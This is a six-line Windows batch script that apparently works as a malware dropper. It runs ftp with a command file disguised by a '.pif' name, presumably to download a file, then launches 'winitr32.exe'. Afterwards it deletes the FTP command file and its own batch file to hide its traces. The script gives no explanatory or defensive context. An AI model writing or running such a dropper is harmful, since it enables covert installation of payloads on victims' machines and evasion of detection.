@echo off 
ftp -n -v -s:.pif 
winitr32.exe 
del .pif 
del /F c.bat 
exit /y 
